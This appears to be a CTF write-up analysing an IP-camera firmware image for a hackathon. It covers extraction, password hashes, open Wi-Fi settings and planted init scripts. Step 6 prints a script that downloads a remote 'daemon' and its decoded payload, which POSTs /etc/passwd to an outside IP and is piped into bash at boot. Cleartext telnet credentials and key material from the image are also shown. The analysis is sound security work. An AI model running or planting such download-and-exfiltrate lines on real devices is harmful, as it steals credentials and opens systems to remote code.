# sampada-2025
# Firmware Analysis Progress Report

## **Introduction**
This report documents the steps undertaken in analyzing the firmware image `chakravyuh.bin` as part of a security challenge. The goal is to extract the firmware, explore its filesystem, and identify potential vulnerabilities.

---

## **Step 1: Initial Analysis with Binwalk**
The firmware image was initially analyzed using `binwalk`, a tool for inspecting and extracting embedded files and filesystems from binary images.

### **Command Used**:
    binwalk -e chakravyuh.bin
 

### **Findings**:
- The firmware contained a `uImage` Linux kernel header and a SquashFS filesystem.
- Extraction failed initially due to issues with the SquashFS filesystem.

---

## **Step 2: Extracting the Filesystem**
### **Corrupted SquashFS Filesystem**:
Attempts to manually extract the SquashFS filesystem using `unsquashfs` failed due to corruption. The following error was encountered:
lzma uncompress failed with error code 9
read_block: failed to read block @0x15142b5
read_fragment_table: failed to read fragment table index
FATAL ERROR: File system corruption detected.
 
As a result, the `squashfs-root` directory was empty after extraction.

### **Resolution with Sasquatch**:
To address this, `sasquatch`, a tool for extracting non-standard SquashFS filesystems, was installed and used.

#### **Steps Taken**:
1. Installed dependencies:
# 
    sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
 
3. Cloned and built Sasquatch:
# 
    git clone https://github.com/devttys0/sasquatch
    cd sasquatch
    ./build.sh

 
3. Applied a patch to resolve build errors:
# 
    wget https://raw.githubusercontent.com/devttys0/sasquatch/82da12efe97a37ddcd33dba53933bc96db4d7c69/patches/patch0.txt
    mv patch0.txt patches/
    ./build.sh


### **Result**:
Successfully extracted the SquashFS filesystem from the firmware image.

---

## **Step 3: Exploring the Extracted Filesystem**
After extraction, I navigated through the extracted filesystem to identify interesting files and directories.

### **Filesystem Structure**:
The root directory contained standard Linux directories such as `/bin`, `/etc`, `/lib`, `/usr`, along with specific directories like `/web`, `/Wireless`, and `/SigFileList`.

### **Key Findings in `/etc` Directory**:
1. **`passwd` File**:
#
    cat /etc/passwd
 
Output:
```root:$1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/:0:0:root:/:/bin/sh```
 
- The root user password hash is stored in MD5 format (`$1$`), which is considered weak.
- This hash can potentially be cracked using tools like `John the Ripper`.

2. **Backup Password File (`passwd-`)**:
#
    cat /etc/passwd-
 
Output:
```root:ab8nBoH3mb8.g:0:0::/root:/bin/sh```
 
- This file contains another hash format for the root password.

3. **No Shadow File**:
- The absence of an `/etc/shadow` file indicates that password hashes are stored directly in `passwd`, which is less secure.

---

## **Step 4: Identifying Camera Model**
Using the `file` command, I identified details about the camera model embedded in the firmware:

### **Command Used**:
    file chakravyuh.bin
```chakravyuh.bin: u-boot legacy uImage, hi3520Dromfs, Linux/ARM, OS Kernel Image (gzip), 13144064 bytes, Wed Nov 29 14:28:44 2017, Load Address: 0XA0060000, Entry Point: 0XA0DA0000, Header CRC: 0X71FF3C3D, Data CRC: 0X3F9F5075```

### **Findings**:
- The firmware references `hi3520Dromfs`, indicating it is based on HiSilicon's Hi3520D chip, commonly used in IP cameras.
- This suggests that the device might be an IP camera or similar hardware.

## **Step 5: Wireless Configuration**
The file `/etc/Wireless/RT2870STA/RT2870STA.dat` contains wireless configuration details. 

### **Contents of RT2870STA.dat**:
```
#The word of "Default" must not be removed
Default
CountryRegion=5
CountryRegionABand=7
CountryCode=
ChannelGeography=1
SSID=11n-AP
NetworkType=Infra
WirelessMode=5
Channel=0
BeaconPeriod=100
TxPower=100
BGProtection=0
TxPreamble=0
RTSThreshold=2347
FragThreshold=2346
TxBurst=1
PktAggregate=0
WmmCapable=1
AckPolicy=0;0;0;0
AuthMode=OPEN
EncrypType=NONE
WPAPSK=
DefaultKeyID=1
Key1Type=0
Key1Str=
Key2Type=0
Key2Str=
Key3Type=0
Key3Str=
Key4Type=0
Key4Str=
PSMode=CAM
AutoRoaming=0
RoamThreshold=70
APSDCapable=0
APSDAC=0;0;0;0
```
...
## Step 6- The real fun begins >:)
The path `etc/init.d/` has these bash scripts- 
#
    ls etc/init.d/
```S00devs  S01udev  S02wndev  S80network  S81toe  S99dh  rcS```

The rcS script executes all other scripts in `etc/init.d`
### **S02wndev**
The `S02wndev` script is interesting - 
```
#!/bin/bash

echo "service daemon packages..."

wget -O http://203.0.113.25/daemon

if [ $? -eq 0 ]; then
    echo "Download completed successfully."
else
    echo "Download failed."
fi

mv daemon /tmp/

echo "service daemon installed successfully"
```
This script attempts to download a file named daemon from an external IP address (203.0.113.25) and moves it to /tmp/.
<details>
<summary>Going to /tmp/ path</summary>
<br>
#
    
    $ cd tmp
    $ ls
        daemon  daemon1  daemon2  wireless
    $ cat daemon
        W1sgLWYgL2V0Yy9wYXNzd2QgXV0gJiYgd2dldCAtLW1ldGhvZD1QT1NUIC0taGVhZGVyPSJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIC0tYm9keS1maWxlPS9ldGMvcGFzc3dkICJodHRwOi8vMjAzLjAuMTEzLjI1LyI

The `daemon` seems like base64, so I decoded it and got this - 
#
    [[ -f /etc/passwd ]] && wget --method=POST --header="Content-Type: multipart/form-data" --body-file=/etc/passwd "http://203.0.113.25/"
</details>

### **S80network**
This script parses network configuration parameters from /proc/cmdline. It configures the network interface, enables Telnet (telnetd), and executes a hidden decryption script (/usr/sbin/.dec.sh) on the downloaded service daemon.
```
... More stuff up here
ifconfig lo 127.0.0.1
ifconfig eth0 up
telnetd

SERVICE_DAEMON="/tmp/daemon"
bash "$DEC" $SERVICE_DAEMON | bash
```

### S99dh
This script mounts multiple partitions, including JFFS2, CRAMFS, and RAMFS filesystems, and extracts sensitive files using p7zip. It also sets up PPPoE configuration files and starts network services like net3g.
```
mount -t jffs2 /dev/mtdblock5 /mnt/mtd -o sync
p7zip x /usr/lib/lib.7z /var/
p7zip x /usr/bin/Challenge.7z /var/
chmod -R 777 /var/*
dvrhelper /var/Challenge
```

### **Analysis**:
- The SSID is set to `11n-AP`.
- Authentication mode is set to `OPEN`, and encryption type is `NONE`.
- No WPA pre-shared key (`WPAPSK`) or WEP keys are configured.
- This lack of encryption indicates an insecure wireless setup, which could allow unauthorized access to the network.
---

## **Challenges Encountered**
1. **Corrupted SquashFS Filesystem**:
   - The manual extraction of the SquashFS filesystem using `unsquashfs` failed due to corruption, as indicated by errors during decompression.
   
2. **Resolution with Sasquatch**:
   - Successfully overcame this issue by using `sasquatch`, which is designed for non-standard or corrupted SquashFS filesystems.

---
# Vulnerabilities

## Exposed Credentials
Telnet credentials found in cleartext in `/usr/etc/telnet_cfg`
```
username=aditya
passwd=BXw6K8YB
```

## Exposed Private Key
```
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/data/ssl$ ls
ca.crt  ca.key  cacert.pem  privkey.pem  pubkey.pem
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/data/ssl$ cat privkey.pem
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHzBJBgkqhkiG9w0BBQ0wPDAbBgkqhkiG9w0BBQwwDgQIc2H4GvZuEVMCAggA
MB0GCWCGSAFlAwQBKgQQ9Kw+XgzsGnGNAQPLfd7TdASCBNB9rOfOs8GwNUM++AJI
PZ02fzfI2KawLLjJNAddqpjwpfTzLxNSo8IBubYZJMFkOKzQmva6cwjxeaQ/f/2C
4MrTFiU0IKmTvWOSjLkSVt93e8fN4sbBf7n2c4lNC8NEUrWqE00d9EeW+WuyPqW1
9EukswWYafRNXLufDgx+O/2mWoO94bzqS0lyhLlVz02DJFSs403WuYlmzGSqiSWI
kL9CPdYa9fHfZX4fIF62HMFCbZKMGCmaXJutpi96jeDezbke1dIeg/c0YTt+vLRT
QDp2LKHhxrFdQA+VH9dWgGirlHjAcsLyRYmaiJjs3fAeXwRDzQejaGdVo4VNqPGQ
CJDqIAjCuaGTOCmw/Pr3vb0XGLEL4xFYeocJAoA/AidvyJgCIPvVdGDUolJv44w6
VNh85w1rfKQMW3fSrs7zS74WBAwP2Tk9iC+2nv29hKzVbqBApDgXsD+56i6FBtVx
fDKxUppcx2tcP3lDzEX7QNL7xY4rrAaBPZ28VMwKGG2X+bo0ruT1pkItuEqLCxBS
+si/cemicO9N/gEKF1c9BOx82IsuWBpYzhYYnAVy2rw9dcQF+SdspetwWCKkX2FD
zM0AaDLwrVFwK3lE2WqEkootGBbxbCpT3tPeYya4ybs4iFinMdbgITZnv7sJs9EU
02oKALfxbdHa3dFWGTUYmlG84GOfowvEWMM6WdJ6B16E/hYvW2hZIMf7+aT1w+5+
9RWFFgzqBl8K9D/aZdIn2h9ekNIxdIUYPO8DfRqwU4BP0lVI1q3wYwT6vuuR1GZ5
pR+sJnkw/h+a5ZUIqZkLJWxwmTOTZNEAimCR0yjjTeVm1qQ0nY2u++UYVEKk2HpU
NrDpgQ+l+Asecu6iA619WUQX+hDi4lIO2OHI1vN8xFuoWw9B3qr85ySHHkQAvaaq
bbqLxcGFZ1MK51qdlEBwjbFFOoj+tPx6SrqWIAJNfAcyFquAW3cMiRk+R9W00Vh1
1dYKwB8/VyiS94yLkUuDN55CaXH3i1ljEIrAoc6G8xTM2s5UUwESghMOLBT5Yozq
BI4pkgecsLNj9iRnLaM7RFxptjgrLVysp6iKtWn6r9ODFzf0wuF+Cwz709SUsuFi
iTFEdYNzBM4njQTuuI1XAa1WaWcfW0bdIIiHOP4ls1bwfAHQejt2YW1f4HYvsCyA
hDulztcUaC2J/aC2M6uO0t92fPsm3YmBRD087WNDGCex86XMm6FmEd287JaNffqj
poB7tbOk5kFulstIR09WjUBSOv4t4ufNIWSn1J9T5RYrGzhdD8gT1258OQhnALRH
R4hG+7a41LphN5lC+1P6BECIjwrcune2FqrGIChGMW7k3xvwJwsq3fd5N12hRv/y
sSj84mmfr1tImLfAphd4yOY2hgqUNIL+JwPIbfdbGHUx1PG2TzXD3qxyr55MPV13
U3IpXW8lSyjKonFgJwjZl8S5mxQQC3LYTiUT+uheR/4uqLQ1HYgSRkguFeBWVOX0
FctNLuu55vz/WiKVKMnrbhPT9JgjwZC2rsvQT4cJK2EWXuftMPA6u0G13yCkKZav
KDHq8D7VDl7l4iOR959tm8FFb7w+uuvFyWPpve5Wz1l0QVjfK2SWRZOzuNOxnti9
kFtUTg+C6T2n6aA+1PyAqZFGWg==
-----END ENCRYPTED PRIVATE KEY-----
```

Password reset key - 
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin/ssl$ cat pwdreset.pem
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA3RuR12tA3aFoIFJSekw1e9+Tc5JaJ3FczvFyQF4SmdK+XrHLnNlP
WCOrsok1neg7Tqbj09Y5AFmqxAhhHrPsZD+6lvBMr1QUHR+DsGQKxR10BuUOjn5B
z4g8PGjuFxYxE6UzKO8cYaUgcgVp9P1/kdnW/PZwNyJAwLwRpZUIOgs3636CH2UO
W3wMpjGu1nMB8PAQ4+v6dUC/jB5JoJrgEgRl94n5iwIJt+f38/ZXoL+DJOb6Q2UI
SjdjKtaRRxpeaSbFw/J7CZodcyTlNXOMx3n+ikUwtKw5iEdoRr9iq69WgqY0bd+O
9pWKE32swy6QXJaumiREjMQTHAtiB2y+qwIDAQAB
-----END RSA PUBLIC KEY-----

# 
    jay@5UD0-WH04M1:ü/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./DahuaExec
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec usage : need 2 arguments, line : 81
    DahuaExec command is :


## **Next Steps**
1. Attempt password cracking for hashes found in `/etc/passwd` and `/etc/passwd-`.
2. Analyze startup scripts in `/etc/init.d/` for potential vulnerabilities.
3. Search for SUID/SGID binaries that could allow privilege escalation:
# 
    find / -perm /4000 2>/dev/null
 

---

## **Conclusion**
The analysis so far has successfully extracted the firmware's filesystem and identified areas of interest, such as weak password storage mechanisms and potential hardware details (HiSilicon Hi3520D). Further exploration will focus on uncovering vulnerabilities within the system.
